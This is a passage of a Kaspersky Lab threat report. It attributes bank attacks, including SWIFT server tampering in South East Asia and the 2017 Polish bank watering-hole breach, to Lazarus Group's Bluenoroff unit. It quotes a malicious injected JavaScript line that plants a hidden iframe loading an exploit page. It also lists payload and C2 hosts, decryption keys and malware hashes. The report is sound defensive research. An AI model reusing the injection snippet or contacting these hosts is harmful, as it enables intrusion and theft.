Its malware has\nbeen found in many serious cyberattacks, such as the massive data leak and [file wiper attack](https://en.wikipedia.org/wiki/Sony_Pictures_hack)\non Sony Pictures Entertainment in 2014; the cyberespionage campaign in South Korea, dubbed\nOperation Troy, in 2013; and Operation DarkSeoul, which attacked South Korean media and\nfinancial companies in 2013.\n\nThere have been several attempts to attribute one of the biggest cyberheists, in Bangladesh in\n2016, to Lazarus Group. Researchers discovered a similarity between the backdoor used in\nBangladesh and code in one of the Lazarus wiper tools. This was the first attempt to link the\nattack back to Lazarus. However, as new facts emerged in the media, [claiming](https://www.bloomberg.com/news/articles/2016-05-10/bangladesh-bank-heist-probe-said-to-find-three-groups-of-hackers) that there were\nat least three independent attackers in Bangladesh, any certainty about who exactly attacked\nthe SWIFT systems, and was behind one of the biggest ever bank heists in history, vanished.\nThe only thing that was certain was that Lazarus malware was used in Bangladesh. However,\nconsidering that we had previously found Lazarus in dozens of different countries, including\nmultiple infections in Bangladesh, this was not very convincing evidence and many security\nresearchers expressed skepticism abound this attribution link.\n\nThis paper is the result of forensic investigations by Kaspersky Lab at banks in two countries far\napart. It reveals new modules used by Lazarus group and strongly links the SWIFT system\nattacking tools to the Lazarus Group’s arsenal of lateral movement tools.\n\nConsidering that Lazarus Group is still active in various cyberespionage and cybersabotage\nactivities, we have segregated its subdivision focusing on attacks on banks and financial\nmanipulations into a separate group which we call Bluenoroff (after one of the tools they used).\n\n## Introduction\n\nSince the beginning of 2016, the cyberattack against the Bangladesh Central Bank, which\nattempted to steal almost 1 billion USD, has been in the spotlight of all major news outlets.\nNew, scattered facts popped up as the investigation developed and new incidents were made\n[public, such as claims by the Vietnamese Tien Phong bank about the prevention of the theft of 1](https://www.bloomberg.com/news/articles/2016-05-15/vietnam-s-tien-phong-bank-targeted-by-swift-hack-reuters-says)\nmillion USD in December 2015.\n\nSecurity companies quickly picked up some patterns in the tools used in those attacks and\n[linked](http://baesystemsai.blogspot.sg/2016/05/cyber-heist-attribution.html) them to Lazarus Group.\n\nThe Lazarus Group’s activity spans multiple years, going back as far as 2009. However, its\nactivity spiked from 2011. The group has deployed multiple malware families across the years,\nincluding malware associated with Operation Troy and DarkSeoul, the Hangman malware\n(2014-2015) and Wild Positron/Duuzer (2015). The group is known for spearphishing attacks,\nwhich include CVE-2015-6585, a zero­day vulnerability at the time of its discovery.\n\n\n-----\n\nThe last major set of publications on the Lazarus actor was made possible due to a security\nindustry alliance lead by Novetta. The respective research announcement was dubbed\n[Operation Blockbuster.](https://www.operationblockbuster.com/)\n\n[The following quote from Novetta's report, about the purpose of the research, caught our eye:](https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)\n\"While no effort can completely halt malicious operations, Novetta believes that these efforts\n_can help cause significant disruption and raise operating costs for adversaries, in addition to_\n_profiling groups that have relied on secrecy for much of their success.\"_\n\n### Bluenoroff: a Child of Lazarus\n\nClearly, even before the Operation Blockbuster announcement, Lazarus had an enormous\nbudget for its operations and would need a lot of money to run its campaigns. Ironically,\nNovetta's initiative could have further increased the already rising operating costs of Lazarus\nattacks, which in turn demanded better financing to continue its espionage and sabotage\noperations. So, one of the new objectives of Lazarus Group could be to become self-sustaining\nand to go after money. This is where Bluenoroff, a Lazarus unit, enters the story. Based on our\nanalysis, we believe this unit works within the larger Lazarus Group, reusing its backdoors and\nleveraging the access it created, while penetrating targets that have large financial streams. Of\ncourse it implies a main focus on banks, but banks are not the only companies that are\nappearing on the radar of Bluenoroff: financial companies, traders and casinos also fall within\nBluenoroff’s area of interest.\n\n[Novetta's report doesn't provide strict attribution, linking only to the FBI's investigation of the](http://www.theregister.co.uk/2015/01/07/sony_pictures_hack_was_definitely_the_norks_insists_fbi_chief/)\nSony Pictures Entertainment hack and a strong similarity in the malware tools. Some time later,\nthe media carried additional facts about how strong the FBI's claims were, supporting this with\nsome data allegedly [from the NSA. The deputy director of the NSA, Richard Ledgett recently](http://www.theregister.co.uk/2015/01/19/nsa_saw_sony_hack/)\n[commented](http://freebeacon.com/national-security/nsa-nation-state-cyber-attack-included-virtual-hand-hand-combat/) on Lazarus and its link to North Korea, however no new evidence of this link has\nbeen provided.\n\nSince the incident in Bangladesh, Kaspersky Lab has been tracking the actor going after SWIFT\nsystems and collecting information about its new attacks and operations. The recently\ndiscovered massive attack against banks in Europe in February 2017 was also a result of this\ntracking. Highly important malicious activity was detected by Kaspersky Lab products in multiple\nEuropean financial institutions in January 2017 and this news eventually ended up being\n[published by the Polish media. The journalists’ investigations jumped slightly ahead of technical](https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/)\ninvestigations and disclosed some facts before the analysis was finished. When it comes to\nLazarus, the investigation and discovery of new facts is a long chain of events which consist of\nforensic and reverse engineering stages following one another. Hence, results cannot be made\navailable immediately.\n\n\n-----\n\n## Previous Link to Lazarus Group\n\nSince the Bangladesh incident there have been just a few articles explaining the connection\n[between Lazarus Group and the Bangladesh bank heist. One was published by BAE systems in](http://baesystemsai.blogspot.sg/2016/05/cyber-heist-attribution.html)\nMay 2016, however, it only included an analysis of the wiper code. This was followed by another\n[blogpost by Anomali Labs confirming](https://www.anomali.com/blog/evidence-of-stronger-ties-between-north-korea-and-swift-banking-attacks) the same wiping code similarity. This similarity was found\nto be satisfying to many readers, but we wanted to look for a stronger connection.\n\n[Other claims that the attacker targeting the financial sector in Poland was Lazarus Group came](https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware-0)\n[from Symantec](https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware-0) in 2017, which noticed string reuse in malware used at one of their Polish\ncustomers. Symantec also confirmed seeing the Lazarus wiper tool in Poland at one of their\ncustomers, however from this it's only clear that Lazarus might have attacked Polish banks.\n\nWhile all these facts look fascinating, the connection between Lazarus attacks on banks and its\nrole in attacks on banks' systems was still a loose one. The only case where specific malware\ntargeting the bank's infrastructure used to connect to SWIFT messaging server was discovered\nis the Bangladesh Central Bank case. However, while almost everybody in the security industry\nhas heard about the attack, few technical details based on the investigation that took place on\nsite at the attacked company have been revealed to the public. Considering that the post-hack\n[stories in the media mentioned that the investigation stumbled upon three different attackers, it](https://www.bloomberg.com/news/articles/2016-05-10/bangladesh-bank-heist-probe-said-to-find-three-groups-of-hackers)\nwas not obvious whether Lazarus was the one responsible for the fraudulent SWIFT\ntransactions, or if Lazarus had in fact developed its own malware to attack banks' systems .\n\nIn addition, relying solely on a single similarity based on file wiping code makes the connection\nnot as strong, because the secure file wiping procedure is a utility function that can be used in\nmany non-malware related projects. Such code could be circulating within certain software\n[developer communities in Asia. One such example is an open-source project called sderase](https://sourceforge.net/projects/sderase/)\navailable with sourcecode at SourceForge, submitted by a developer with an Asian looking\nnickname - zhaoliang86. We assumed that it's possible that there are many other projects like\nsderase available on Asian developer forums, and code like this could be borrowed from them.\n\nWe would like to add a few strong facts that link some attacks on banks to Lazarus, to share\nsome of our own findings and to shed light on the recent TTPs (Tactics, Techniques and\nProcedures) used by the attacker, including some as yet unpublished details from the attack in\nEurope in 2017.\n\n## Incident #1\n\nThe incident happened in a South East Asian country in August 2016, when Kaspersky Lab\nproducts detected new malicious activity from the Trojan-Banker.Win32.Alreay malware family.\nThis malware was linked to the arsenal of tools used by the attackers in Bangladesh. As the\nattacked organization was a bank, we decided to investigate this case in depth. During the\nmonths of cooperation with the bank that followed, we revealed more and more tools hidden\n\n\n-----\n\ndeep inside its infrastructure. We also discovered that the attackers had learned about our\nupcoming investigation and wiped all the evidence they could, including tools, configuration files\nand log records. In their rush to disappear they managed to forget some of the tools and\ncomponents, which remained in the system.\n\n### Malware Similarity\n\nJust like other banks that have their own dedicated SWIFT messaging server, the bank in\nIncident #1 had its own. The server was running SWIFT Alliance software.\n\nSince the notorious Bangladesh cyberattack, the SWIFT software has been updated to include\nsome additional checks which verify software and database integrity. This was an essential and\nlogical measure as attackers had shown attempts to tamper with SWIFT software on disk and in\n[memory, disabling direct database manipulations, as previously reported in the analysis](http://baesystemsai.blogspot.sg/2016/04/two-bytes-to-951m.html) by BAE\nSystems. This was discovered by the attackers, who tracked the changes in SWIFT Alliance\nsoftware. The malware tools found in Incident #1 suggested that the attackers had carefully\nanalyzed the patches and implemented a better way to patch new changes. More details on the\npatcher tool are provided in the Appendix.\n\nThe malware discovered on the SWIFT server strongly linked Incident #1 to the incident in\nBangladesh. While certain tools were new and different in the malware code, the similarities left\nno doubt that the attacker in Incident #1 used the same code base. Below are some of the\nidentical code and encryption key patterns that we found.\n\n|Col1|Col2|\n|---|---|\n|Sample submitted from Bangladesh and mentioned in the BAE Systems blog. MD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee|Sample discovered in Incident #1 to copy SWIFT message files to separate storage. MD5:f5e0f57684e9da7ef96dd459b554fded|\n\n\n-----\n\nThe screenshot above shows the disassembly of the logging function implemented in the\nmalware. The code is almost identical. It was improved a little by adding current process ID to\nthe log record.\n\nNever stopping code modification by the developer seems to be one of Lazarus Group’s longterm strategies: it keeps changing the code even if it doesn't introduce much new functionality.\nChanging the code breaks Yara recognition and other signature-based detections. Another\nexample of changing code, while preserving the core idea, originates from Novetta's sample set.\nOne of the Lazarus malware modules that Novetta discovered used a binary configuration file\nthat was encrypted with RC4 and a hardcoded key.\n\nA fragment of the code that loads, decrypts and verifies config file magic is shown below.\n\nNote that the first DWORD of the decrypted data has to be 0xAABBCCDD. The new variants of\nLazarus malware used since Novetta’s publication included a different code, with a new magic\nnumber and RC4 key, but following the same idea.\n\n|Col1|Col2|\n|---|---|\n|Sample submitted from Bangladesh. Uses magic value 0xA0B0C0D0 MD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee|Sample discovered in Incident #1. Uses magic value 0xA0B0C0D0 MD5: f5e0f57684e9da7ef96dd459b554fded|\n\n\n-----\n\nThe code above is used to read, decrypt and check the external config file. You can see how it\nwas modified over time. The sample from Incident #1 has certain differences which would break\nregular binary pattern detection with Yara. However, it's clearly the same but improved code.\nInstead of reading the file once, malware attempts to read it up to five times with a delay of\n100ms. Then it decrypts the file with a hardcoded RC4 key, which is an identical 16 bytes in\nboth samples (4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF), and verifies the magic\nvalue which must be 0xA0B0C0D0.\n\nAccording to forensic analysis, this malware was used by an actor who had remote access to\nthe system via its own custom set of backdoors. Most of the analyzed hosts were not directly\ncontrolled via a C2 server. Instead they connected to another internal host that relayed TCP\nconnection to the C2 using a tool that we dubbed the TCP Tunnel Tool. This tool can be used to\nchain internal hosts within the organization and relay connection to the real C2 server. This\nmakes it harder for administrators to identify compromised hosts, because local connections\nusually seem less suspicious. One very similar tool was also described by Novetta, which it\n[dubbed Proxy PapaAlfa. This tool is one of the most popular during an attack. Some hosts were](https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Tools-Report.pdf)\nused only as a relay, with no additional malware installed on them. That's why we believe that\nthe Lazarus actor has many variants of this tool and changes it often to scrutinize network or\nfile-based detection. For full the technical details of the tool discovered in Incident #1 see\nAppendix (MD5: e62a52073fd7bfd251efca9906580839).\n\nOne of the central hosts in the bank, which was running SWIFT Alliance software, contained a\nfully-fledged backdoor (MD5: 2ef2703cfc9f6858ad9527588198b1b6) which has the same strong\n[code and protocol design as a family of backdoors dubbed Romeo by Novetta. The same, but](https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf)\npacked, backdoor was uploaded to a multiscanner service from Poland and South Korea in\nNovember 2016 (MD5: 06cd99f0f9f152655469156059a8ea25). We believe that this was a\nprecursor of upcoming attacks on Poland and other European countries, however this was not\nreported publicly in 2016. The same malware was delivered to the European banks via an\nexploit attack in January 2017.\n\nThere are many other visible similarities between the Lazarus malware reported by Novetta and\nmalware discovered in Incident #1, such as an API import procedure and a complicated custom\nPE loader. The PE loader was used by many malware components: DLL loaders, injectors, and\nbackdoors.\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n|LimaAlfa sample from Novetta's Lazarus malware set (loader of other malicious files). MD5: b135a56b0486eb4c85e304e636996ba1|Sample discovered in Incident #1 (backdoor which contains PE loader code). MD5: bbd703f0d6b1cad4ff8f3d2ee3cc073c|\n\n\nNote that the modules presented differ in file type and purpose: Novetta's sample is an EXE file\nwhich is used to load other malicious PE files, while the sample discovered in Incident #1 is a\nDLL backdoor. Still, they are based on an identical code base.\n\nThe discussion about similarities can be continued. However, it's now very clear that the attack\nin Bangladesh and Incident #1 are linked through the use of the Lazarus malware arsenal.\n\n### Forensic Findings on the SWIFT Server\n\nIn the case of the South East Asian attack we have seen infections both on the SWIFT server\nand several systems that belong to the IT department of the company. We managed to recover\nmost of the modules, while some others were securely wiped and became inaccessible for\nanalysis. Nevertheless, in many cases we see references to unique filenames that were also\nseen on other infected systems and were most likely malicious tools. As we learned from the\nanalysis of this incident, there are cross-victim event correlations, which suggest that attackers\nworked in multiple compromised banks at the same time.\nHere are our key takeaways from the forensic analysis:\n\n  - The attackers had a foothold in the company for over seven months. The South East\n\nAsian bank was breached at the time when the Bangladesh heist happened.\n\n  - Most of the malware was placed into a C:\\Windows directory or C:\\MSO10 directory.\n\nThese two paths were hardcoded into several modules.\n\n  - The malware was compiled days or sometimes hours before it was deployed, which\n\nsuggests a very targeted and surgical operation.\n\n  - The attackers used an innocent looking decryptor with a custom PE loader designed to\n\nbypass detections by security products on start.\n\n  - Most of the modules are designed to run as a service or have administrative/SYSTEM\n\nrights.\n\n\n-----\n\n  - The backdoors found on the SWIFT server in this attack matched the design described\n\nby Novetta as a Romeo family of backdoors (RATs) in their paper, which directly links\nthe South East Asian case to Lazarus.\n\n  - Not everything ran smoothly for the attacker. We found multiple events of process\n\ncrashes and system restarts during the time of the alleged attacker’s presence.\n\n  - Attackers operated out of office hours according to the victim's schedule and timezone to\n\navoid detection.\n\n  - They attempted to debug some problems by enabling the sysmon driver for several\n\nhours. Later, they forgot to wipe the sysmon event log file, which contained information\non running processes, their respective commandlines and file hashes.\n\n  - There was specific malware targetting SWIFT Alliance software that disabled internal\n\nintegrity checks and intercepted processed transaction files. We called this SWIFT\nmalware and directly attribute authorship to the Bluenoroff unit of Lazarus.\n\n  - The SWIFT malware is different from other Lazarus tools, because it lacks obfuscation,\n\ndisguise and packing.\n\n  - Persistence was implemented as Windows service DLL, registered inside the group of\n\nNetwork Services (netsvcs).\n\n  - They used a keylogger, which was stored in an encrypted container. This was decrypted\n\nand loaded by a loader that fetched the encrypted information from a different machine\n(disguised as one of the files in C:\\Windows\\Web\\Wallpaper\\Windows\\).\n\n  - The attackers patched SWIFT software modules on disk permanently, but later rolled\n\nback the changes. Another operational failure was forgetting to restore the patched\nmodule in the backup folder. The patch applied to the liboradb.dll module is very similar\n[to the one described by BAE Systems in its article about the Bangladesh attacks.](http://baesystemsai.blogspot.ru/2016/04/two-bytes-to-951m.html)\n\n  - Attackers used both passive and active backdoors. The passive backdoors listened on\n\nthe TCP port which was opened in Firewall via a standard netsh.exe command. That left\nadditional records in system event log files. The port was set in the config, or passed as\na command-line argument. They prefer ports ending with 443, i.e. 6443, 8443, 443.\n\n  - Internal SWIFT software logs contained several alerts about database failures from June\n\nto August 2016, which links to attackers’ attempts to tamper with the database of\ntransactions.\n\n  - The attackers didn't have visual control of the desktop through their backdoors which is\n\nwhy they relied on their own TCP tunnel tools that forwarded RDP ports to the operator.\nAs a result we identified the anomalous activity of Terminal Services: they worked late\nand sometimes during weekends.\n\n  - One of the earliest Terminal Services sessions was initiated from the webserver hosting\n\nthe company's public website. The webserver was in the same network segment as the\nSWIFT server and was most likely the patient zero in this attack.\n\n### Timeline of Attacks\n\nDue to long-term cooperation with the bank we had the chance to inspect several compromised\nhosts in the bank. Starting with analysis of the central host, which was the SWIFT server, we\n\n\n-----\n\ncould see connections to other hosts in the network. We suspected them to be infected and this\nwas confirmed during a closer look.\n\nOnce the contact between that bank and Kaspersky Lab was established, the attackers\nsomehow realized that the behavior of system administrators was not normal and soon after\nthat they started wiping all traces of their activity. Revealing traces of their presence took us a\ncouple of months, but we managed to collect and build a rough timeline of some of their\noperations, which again provided us with activity time information.\n\nWe have collected all timestamps that indicate the activity of the attackers and put them in one\ntable, which has helped us to build a timeline of events based on the remaining artefacts.\n\nFig. Timeline of events in related to Incident #1.\n\n#### Synchronicity of Events in Different Incidents\n\nDuring the analysis of event log files we found one coming from Sysinternals Sysmon.\nSurprisingly, the event log file contained records of malware activity from months before the\nforensic analysis, logging some of the intruders’ active work.\n\nWhen we discovered that strange sysmon log we were confused, as it seemed like the attacker\nenabled it, or someone who wanted to monitor the attacker did. Later on, a security researcher\nfamiliar with the Bangladesh investigation results confirmed that similar sysmon activity was\nalso registered on 29 January 2016. This means that it happened to at least two different victims\nwithin minutes.\n\n\n-----\n\nAnother event was related to tampering with SWIFT database modules.\n\nDuring the analysis of systems in Incident #1, we found a directory\n**C:\\Users\\%username%\\Desktop\\win32\\ which was created at 2016-02-05 03:22:51 (UTC).**\nThe directory contained a patched liboradb.dll file which was modified at 2016-02-04 14:07:07\n**(UTC), while the original unpatched file seems to be created on 2015-10-13 12:34:26 (UTC) and**\nstored in liboradb.dll.bak. This suggests attacker activity around 2016-02-04 14:07:07 (UTC).\nThis was the date of the widely publicized Bangladesh cyberheist.\n\nThis finding corresponds to already known incident at Bangladesh Central Bank in February\n[2016. According to BAE, in BCB the module “liboradb.dll” was also patched with the same “NOP](https://baesystemsai.blogspot.sg/2016/04/two-bytes-to-951m.html?m=1)\nNOP” technique.\n\nFig. Patched module in Bangladesh case (courtesy of BAE Systems).\n\nSo far, this means that the attackers' activity and the file modification occurred on the same day\nin two banks in two different countries on 29 January, 2016 and 4 February, 2016.\n\nTo conclude, Bangladesh Central Bank was probably one of many banks compromised for the\nmassive operation involving hundreds of millions of dollars. A bank in South East Asia linked to\nIncident #1 is live confirmation of this fact.\n\n### Anti-Forensics Techniques\n\nSome of the techniques used by the attackers were quite new and interesting. We assume that\nthe attackers knew about the constraints implied by the responsibility of SWIFT and the bank\nwhen it comes to investigating a cyberattack. So far, all infected assets were chosen to be\ndistributed between SWIFT and the bank’s own systems. By splitting the malicious payload into\ntwo pieces and placing them in two different zones of responsibility, the attackers attempted to\nachieve zero visibility from any of the parties that would investigate or analyze suspicious files\non its side. We believe that involving a third-party like Kaspersky Lab makes a big change to the\nwhole investigation.\n\n\n-----\n\nTechnically it was implemented through a simple separation of files, which had to be put\ntogether to form a fully functioning malicious process. We have seen this approach at least\ntwice in current forensic analysis and we strongly believe that it is not a coincidence.\n\nMalware Component 1 Malware Component 2 Description\n\nTrojan Dropper, Dropped Backdoor, was The backdoor was dropped on the\nigfxpers.exe was found found on HostD disk by the Dropper, if the operator\non HostC started it with valid secret password,\n\nprovided via commandline.\n\nDLL Injector, esserv.exe Keylogger, loaded by DLL The Keylogger was stored in\nwas found on HostD Injector was found on encrypted container and could only be\n\n**HostA** loaded with the DLL Injector from\n\nanother host.\n\nIt's common for forensic procedures to be applied to a system as a whole. With standard\nforensic procedures, which include the analysis of a memory dump and disk image of a\ncompromised system, it is uncommon to look at a given computer as a half-compromised\nsystem, meaning that the other ingredient which makes it compromised lives elsewhere.\nHowever, in reality the system remains breached. It implies that a forensic analyst focusing on\nthe analysis of an isolated single system may not see the full picture. That is why we believe\nthat this technique was used as an attempt to prevent successful forensic analysis. With this in\nmind, we'd like to encourage all forensics analysts to literally look outside of the box when\nconducting breach analysis, especially when you have to deal with Lazarus.\n\n### Password Protected Malware\n\nAnother interesting technique is in the use of password-protected malware. While this technique\nisn't exactly new, it is usually a signature of advanced attackers. One such malware that comes\n[to mind is the mysterious Gauss](https://securelist.com/blog/incidents/33561/the-mystery-of-the-encrypted-gauss-payload-5/) malware, which requires a secret ingredient to decrypt its\nprotected payload. We published our research about Gauss malware in 2012 and since then\nmany attempts have been made to crack the Gauss encryption passphrase, without any\nsuccess.\n\nThe idea is quite a simple yet very effective anti-forensics measure: the malware dropper\n(installer) uses a secret passphrase passed via command line argument. The argument is\nhashed with MD5 and is used as the key to decrypt the payload. In the context of the Incident\n#1 attack, the payload was, in turn, a loader of the next stage payload, which was encrypted\nand embedded into the loader. The loader didn't have the key to decrypt its own embedded\npayload, but it looked for the decryption key in the registry value. That registry value should had\nbeen set by the installer, otherwise the malware doesn't work. So, clearly, unless you have the\nsecret passphrase, you cannot reconstruct the full chain of events. In the case of Incident #1 we\nmanaged to get the passphrase and it was a carefully selected string consisting of 24 random\nalpha-numeric upper and lowercase characters.\n\n|Malware Component 1|Malware Component 2|Description|\n|---|---|---|\n|Trojan Dropper, igfxpers.exe was found on HostC|Dropped Backdoor, was found on HostD|The backdoor was dropped on the disk by the Dropper, if the operator started it with valid secret password, provided via commandline.|\n|DLL Injector, esserv.exe was found on HostD|Keylogger, loaded by DLL Injector was found on HostA|The Keylogger was stored in encrypted container and could only be loaded with the DLL Injector from another host.|\n\n\n-----\n\n### About The Infection Vector\n\nDue to the age of the breach inside the bank, little has been preserved and it's not very clear\nhow the attackers initially breached the bank. However, what becomes apparent is that they\nused a web server located in the bank to connect to the SWIFT server via Terminal Services. In\nsome cases they would switch from the web server to another internal infected host that would\nwork as a relay. However, all the hosts that we analyzed had no interaction with the external\nworld except for the web server mentioned, which hosted the company's website and was\nexposed to the world.\n\nThe web server installation was quite fresh: it had hosted the company's new website, which\nwas migrated from a previous server, for just a few months before it was compromised. The\nbank contracted a pentesting company to do a security assessment of the new website which\nwas ongoing when Lazarus breached the server. The infection on the web server appeared in\nthe middle of pentesting probes. Some of these probes were successful and the pentester\nuploaded a C99-like webshell to the server as a proof of breach. Then the pentester continued\nprobing other vulnerable scripts on the server, which is why we believe that the intention was\nbenign. In the end, all scripts discovered by the pentester were reported and patched.\n\nConsidering that there were known breaches on the webserver, which were identified and\npatched with the help of an external security audit, there is a high probability that the server was\nfound and breached by the Lazarus actor before the audit. Another possibility is that the C99shell uploaded by the pentester was backdoored and beaconed back to the Lazarus Group,\nwhich immediately took over the server. Unfortunately, the C99-shell was identified only by the\nquery string, the body of the webshell was not recovered.\n\nOne way or another, the breach of the web server seems to be the most probable infection\nvector used by Lazarus to enter the bank’s network.\n\n## Incident #2\n\nOur investigation in Europe started with very similar symptoms to those which we have\npreviously seen in South East Asia in Incident #1. In January 2017 we received information\nabout new detections of the Bluenoroff malware we have been tracking. One of the alarming\ntriggers was the sudden deployment of freshly built samples, which indicated that a new serious\noperation had begun.\n\nAfter establishing a secure communication with some of the targets, we passed some indicators\nof compromise and quickly got some feedback confirming the hits.\n\n\n-----\n\nThanks to the support and cooperation of a number of partners, we managed to analyse\nmultiple harddrive disk images that were made soon after taking the identified compromised\nsystems offline.\n\nAnalysis of the disk images revealed the presence of multiple malware tools associated with the\nBluenoroff unit of the Lazarus Group. Analysis of the event logs indicate that several hosts were\ninfected and other hosts had been targeted by the attackers for lateral movement operations.\nAttackers attempted to access the domain controller and mail server inside the companies,\nwhich is why we recommend that future investigators should avoid using corporate email for\ncommunicating with victims of Lazarus Group.\n\nIn one case, the initial attack leveraged an old vulnerability in Adobe Flash Player, which was\npatched by Adobe in April 2016. Although an updater was installed on this machine, it failed to\nupdate Adobe Flash Player, probably due to network connectivity issues.\n\n### Initial Infection. \n\nIn one of the incidents, we discovered that patient zero visited a compromised government\nwebsite using Microsoft Internet Explorer on 10 January, 2017.\n\nInfected webpage URL: https://www.knf.gov[.]pl/opracowania/sektor_bankowy/index.html\n\nThe time of the visit is confirmed by an Internet Explorer cache file, which contains an html page\nbody from this host.\n\nThe webpage loaded a Javascript resource from the same webserver referenced from the page:\n\n<script type=\"text/javascript\" src=\"/DefaultDesign/Layouts/KNF2013/resources/accordian**src.js?ver=11\"></script>**\n\nThe information provided below appeared in [the public domain.](https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/)\n\n_Preliminary investigation_ _suggests that the starting point for the infection could have been located on_\n_the webserver of a Polish financial sector regulatory body, Polish Financial Supervision Authority_\n_(www.knf.gov[.]pl). Due to a slight modification of one of the local JS files, an external JS file was loaded,_\n_which could have executed malicious payloads on selected targets._\n\n\n-----\n\nNote: image is a courtesy of badcyber.com\n\n_The_ _unauthorised_ _code_ _was_ _located_ _in_ _the_ _following_ file:\n**http://www.knf.gov[.]pl/DefaultDesign/Layouts/KNF2013/resources/accordian-src.js?ver=11**\n_and looked like this:_\n\n_document.write(\"<div_ _id='efHpTk'_ _width='0px'_ _height='0px'><iframe_ _name='forma'_\n\n_src='https://sap.misapor[.]ch/vishop/view.jsp?pagenum=1' width='145px' height='146px' style='left:-_\n\n_2144px;position:absolute;top_\n\n_:0px;'></iframe></div>\");_\n\n_After successful exploitation, malware was downloaded to the workstation, where, once executed, it_\n_connected to some foreign servers and could be used to perform network reconnaissance, lateral_\n_movement and data exfiltration._\n\nVisiting the exploit page resulted in Microsoft Internet Explorer crashing, which was recorded\nwith a process dump file. The dumped process included the following indicators:\n\n[version=\"2\"]\n\n[swfURL=\"https://sap.misapor[.]ch/vishop/include/cambio.swf\"\npageURL=\"https://sap.misapor[.]ch/vishop/view.jsp\"]...\n\n\n-----\n\nAdditional research by Kaspersky Lab discovered that the exploit file at\n**hxxp://sap.misapor[.]ch:443/vishop/include/cambio.swf resulted in the download of a**\nbackdoor module.\n\nBased on our own telemetry, Kaspersky Lab confirms that sap.misapor[.]ch was compromised\nas well, and was spreading exploits for Adobe Flash Player and Microsoft Silverlight. Some of\nthe known vulnerability CVEs observed in attacks originate from that website:\n\n1. CVE-2016-4117\n2. CVE-2015-8651\n3. CVE-2016-1019\n4. CVE-2016-0034\n\nThe Flash exploit used in the attacks was very similar to known exploits from the Magnitude\nExploit Kit. These vulnerabilities have been patched by Adobe and Microsoft since April 2016\nand January 2016 respectively.\n\nFig. Part of the exploit code\n\nInside the exploits, one can see a lot of Russian word strings, like “chainik”, “BabaLena”,\n“vyzov_chainika”, “podgotovkaskotiny”, etc. The shellcode downloads the final payload from:\n**_https://sap[.]misapor.ch/vishop/view.jsp?uid=[redacted]&pagenum=3&eid=00000002&s=2_**\n**_&data=_**\n\n\n-----\n\nIt's worth mentioning here that Lazarus used other false flags in conjunction with this Russian\nexploit code. They also used some Russian words in one of the backdoors and packed the\nmalware with a commercial protector (Enigma) developed by a Russian author. However, the\nRussian words in the backdoor looked like a very cheap imitation, because every native\nRussian speaking software developer quickly noticed how odd these commands were.\n\nFig. Russian words in the backdoor code.\n\nAt the time of research this URL was dead but we were able to find an identical one which leads\nto a malicious file download (MD5: 06cd99f0f9f152655469156059a8ea25, detected as TrojanBanker.Win32.Alreay.gen) from http://www.eye-watch[.]in/design/img/perfmon.dat.\nInterestingly, this sample was uploaded to VirusTotal from Poland and Korea in November\n2016. It is a packed version of a previously known backdoor used by Lazarus attackers in\nIncident #1’s bank.\n\n### What Made the Breach Possible\n\nSince the attackers didn’t use any zero-days, the infiltration was successful because of nonupdated software. In one case, we observed a victim running the following software:\n\nThe exploit breached the system running Adobe Flash Player, version 20.0.0.235. This version\nwas officially released on 8 December, 2015.\n\nAdobe implemented a self-update mechanism for Flash Player some years ago and the\nanalyzed system indeed had a scheduled job, which attempted to periodically update Adobe\nFlash Updater. We checked the event logs of the Task Scheduler and this task was regularly\nrunning.\n\nThe task was started as SYSTEM user and attempted to connect to the Internet to fetch Flash\nPlayer updates from fpdownload.macromedia.com. However, this attempt failed, either\nbecause it couldn't find the proxy server to connect to the update server, or because of missing\ncredentials for the proxy. The last failed attempt to update Adobe Flash was dated in December\n2016, a month before the breach happened. If only that updater could have accessed the\n\n\n-----\n\nInternet the attack would have failed. This is an important issue that may be widely present in\nmany corporate networks.\n\n### Lateral Movement. Backup Server.\n\nAfter the initial breach the attackers pivoted from infected hosts and emerged to migrate to a\nsafer place for persistence. A backup server was chosen as the next target.\n\nBased on traffic logs provided for our analysis, we confirmed that there were connections to\nknown Bluenoroff C2 servers originating from infected hosts. The following information was\nfound in the network logs:\n\nDestination:Port Type Bytes Transfered\n\n82.144.131[.]5:8080 Incomplete Less than 1KB\n\n82.144.131[.]5:443 SSL Less than 3KB\n\nBy checking other non-whitelisted hosts and IP ranges we were able to identify an additional C2\nserver belonging to the same attackers:\n\nDestination:Port Type Bytes Transfered\n\n73.245.147[.]162:443 SSL Less than 1.5MB\n\nWhile this additional C2 hasn't been reported previously, there were no additional hosts found\nthat connected to that server.\n\n### Lateral Movement. Host1.\n\nDuring the attack, the threat actor deployed a number of other malware to a second machine we\ncall Host1. The malware files include:\n\nFilename Size MD5\n\n**%SYSTEM%\\msv2_0.dll** 78'848 bytes 474f08fb4a0b8c9e1b88349098de10b1\n\n**%WINDIR%\\Help\\msv2_0.chm** 729'088 bytes 579e45a09dc2370c71515bd0870b2078\n\n**%WINDIR%\\Help\\msv2_0.hlp** 3'696 bytes 7413f08e12f7a4b48342a4b530c8b785\n\nThe msv2_0.dll decrypts and loads the payload from msv2_0.chm, which, in turn, decrypts and\nloads a configuration file from msv2_0.hlp. msv2_0.hlp, which is encrypted with Spritz\nencryption algorithm and the following key: 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72\n\n|Destination:Port|Type|Bytes Transfered|\n|---|---|---|\n|82.144.131[.]5:8080|Incomplete|Less than 1KB|\n|82.144.131[.]5:443|SSL|Less than 3KB|\n\n|Destination:Port|Type|Bytes Transfered|\n|---|---|---|\n|73.245.147[.]162:443|SSL|Less than 1.5MB|\n\n|Filename|Size|MD5|\n|---|---|---|\n|%SYSTEM%\\msv2_0.dll|78'848 bytes|474f08fb4a0b8c9e1b88349098de10b1|\n|%WINDIR%\\Help\\msv2_0.chm|729'088 bytes|579e45a09dc2370c71515bd0870b2078|\n|%WINDIR%\\Help\\msv2_0.hlp|3'696 